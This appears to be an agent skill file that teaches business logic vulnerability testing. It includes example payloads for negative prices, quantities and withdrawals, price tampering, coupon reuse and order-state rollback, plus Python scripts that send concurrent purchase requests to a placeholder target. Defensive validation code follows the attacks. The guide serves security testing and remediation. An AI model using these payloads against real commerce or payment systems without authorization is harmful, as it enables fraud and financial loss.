---
name: business-logic-testing
description: Professional skills and methodology for business logic vulnerability testing
version: 1.0.0
---

# Business Logic Vulnerability Testing

## Overview

Business logic vulnerabilities are design flaws in an application's business processing flow that can lead to unauthorized operations, data tampering, financial loss, and more. This skill provides methods for detecting, exploiting, and protecting against business logic vulnerabilities.

## Vulnerability Types

### 1. Workflow Bypass

**Skipping validation steps:**
- Directly accessing the final step
- Modifying step order
- Repeating steps

### 2. Price Manipulation

**Negative prices:**
- Entering negative amounts
- Causing account balance to increase

**Price tampering:**
- Modifying frontend prices
- Modifying prices in API requests

### 3. Quantity Limit Bypass

**Negative quantities:**
- Entering negative numbers
- May cause inventory to increase

**Exceeding limits:**
- Modifying quantity limits
- Bypassing via batch operations

### 4. Race Conditions

**Concurrent requests:**
- Sending multiple requests simultaneously
- Bypassing single-use limits

### 5. State Manipulation

**State rollback:**
- Changing a completed order back to pending payment
- Modifying order status

## Testing Methods

### 1. Workflow Analysis

**Identify business processes:**
- Registration flow
- Purchase flow
- Withdrawal flow
- Approval flow

**Test step skipping:**
```
Normal flow: Step 1 -> Step 2 -> Step 3
Test: Directly access Step 3
Test: Step 1 -> Step 3 (skip Step 2)
```

### 2. Parameter Tampering

**Modify key parameters:**
```http
POST /api/purchase
{
  "product_id": 123,
  "quantity": 1,
  "price": 100.00  # Modify to 0.01
}
```

**Negative value testing:**
```json
{
  "quantity": -1,
  "price": -100.00
}
```

### 3. Concurrency Testing

**Send simultaneous requests:**
```python
import threading
import requests

def purchase():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Send 10 requests simultaneously
for i in range(10):
    threading.Thread(target=purchase).start()
```

### 4. State Modification

**Modify order status:**
```http
PATCH /api/order/123
{
  "status": "completed"  # Modify to completed
}
```

**Rollback status:**
```http
PATCH /api/order/123
{
  "status": "pending"  # Rollback from completed to pending payment
}
```

## Exploitation Techniques

### Price Manipulation

**Negative price:**
```json
{
  "product_id": 123,
  "price": -100.00,
  "quantity": 1
}
```

**Modify frontend price:**
```javascript
// Frontend code
const price = 100.00;

// Modify to
const price = 0.01;
```

**API price modification:**
```http
POST /api/checkout
{
  "items": [
    {
      "product_id": 123,
      "price": 0.01,  # Original price 100.00
      "quantity": 1
    }
  ]
}
```

### Quantity Limit Bypass

**Negative quantity:**
```json
{
  "product_id": 123,
  "quantity": -10  # May cause inventory to increase
}
```

**Exceed limit:**
```json
{
  "product_id": 123,
  "quantity": 999999  # Exceeds single purchase limit
}
```

### Coupon Abuse

**Repeated use:**
```http
POST /api/checkout
{
  "coupon": "DISCOUNT50",
  "items": [...]
}

# Reuse the same coupon
```

**Expired coupon:**
```http
POST /api/checkout
{
  "coupon": "EXPIRED_COUPON",  # Use expired coupon
  "items": [...]
}
```

### Withdrawal Vulnerabilities

**Negative withdrawal:**
```json
{
  "amount": -1000.00  # May cause account balance to increase
}
```

**Exceed balance:**
```json
{
  "amount": 999999.00  # Exceeds account balance
}
```

### Race Conditions

**Concurrent purchase:**
```python
import threading
import requests

def buy():
    requests.post('https://target.com/api/purchase',
                  json={'product_id': 123, 'quantity': 1})

# Flash sale, concurrent requests
for i in range(100):
    threading.Thread(target=buy).start()
```

## Bypass Techniques

### Frontend Validation Bypass

**Directly call API:**
- Bypass frontend JavaScript validation
- Send API requests directly

**Modify requests:**
- Intercept with Burp Suite
- Modify parameters before sending

### Status Code Analysis

**Observe responses:**
- 200 OK - Possibly successful
- 400 Bad Request - Parameter error
- 403 Forbidden - Insufficient permissions
- 500 Internal Server Error - Server error

### Error Message Exploitation

**Extract information from error messages:**
```
Error: "Insufficient balance, current balance: 100.00"
-> Can obtain account balance information
```

## Tool Usage

### Burp Suite

**Using Repeater:**
1. Intercept business requests
2. Modify key parameters
3. Observe responses

**Using Intruder:**
1. Mark parameters
2. Use payload lists
3. Batch testing

### Custom Scripts

```python
import requests
import json

def test_price_manipulation():
    # Test price modification
    for price in [0.01, -100, 0, 999999]:
        data = {
            "product_id": 123,
            "price": price,
            "quantity": 1
        }
        response = requests.post('https://target.com/api/purchase',
                                json=data)
        print(f"Price {price}: {response.status_code}")

test_price_manipulation()
```

## Verification and Reporting

### Verification Steps

1. Confirm ability to bypass business logic restrictions
2. Verify ability to perform unauthorized operations
3. Assess impact (financial loss, data tampering, etc.)
4. Document complete POC

### Report Key Points

- Vulnerability location and business process
- Unauthorized operations that can be performed
- Complete exploitation steps and PoC
- Remediation recommendations (server-side validation, business rule checks, etc.)

## Protective Measures

### Recommended Solutions

1. **Server-side Validation**
   ```python
   def process_purchase(product_id, quantity, price):
       # Get real price from database
       real_price = db.get_product_price(product_id)

       # Validate price
       if price != real_price:
           raise ValueError("Price mismatch")

       # Validate quantity
       if quantity <= 0:
           raise ValueError("Invalid quantity")

       # Process purchase
       process_order(product_id, quantity, real_price)
   ```

2. **State Machine Validation**
   ```python
   class OrderState:
       PENDING = "pending"
       PAID = "paid"
       SHIPPED = "shipped"
       COMPLETED = "completed"

       TRANSITIONS = {
           PENDING: [PAID],
           PAID: [SHIPPED],
           SHIPPED: [COMPLETED]
       }

       def can_transition(self, from_state, to_state):
           return to_state in self.TRANSITIONS.get(from_state, [])
   ```

3. **Concurrency Control**
   ```python
   import threading

   lock = threading.Lock()

   def process_order(order_id):
       with lock:
           # Check order status
           order = db.get_order(order_id)
           if order.status != 'pending':
               raise ValueError("Order already processed")

           # Process order
           process(order)
   ```

4. **Business Rule Validation**
   ```python
   def validate_business_rules(order):
       # Validate quantity limit
       if order.quantity > MAX_QUANTITY:
           raise ValueError("Quantity exceeds limit")

       # Validate price range
       if order.price <= 0:
           raise ValueError("Invalid price")

       # Validate inventory
       if order.quantity > get_stock(order.product_id):
           raise ValueError("Insufficient stock")
   ```

5. **Audit Log**
   ```python
   def log_business_action(user_id, action, details):
       log_entry = {
           "user_id": user_id,
           "action": action,
           "details": details,
           "timestamp": datetime.now()
       }
       db.log_action(log_entry)
   ```

## Notes

- Only perform testing in authorized test environments
- Avoid causing real impact on business operations
- Note differences across various business flows
- Pay attention to data consistency during testing
